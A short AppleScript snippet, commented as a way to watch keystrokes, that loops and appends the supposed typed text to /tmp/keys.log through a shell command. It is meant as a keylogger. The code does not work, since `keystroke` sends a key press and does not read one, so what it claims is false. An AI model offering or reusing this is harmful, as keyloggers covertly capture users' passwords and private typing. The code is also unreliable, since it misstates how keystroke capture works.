-- Uses System Events to watch keystrokes
tell application "System Events"
	repeat
		set typedText to keystroke ""
		do shell script "echo " & quoted form of typedText & " >> /tmp/keys.log"
		delay 1
	end repeat
end tell
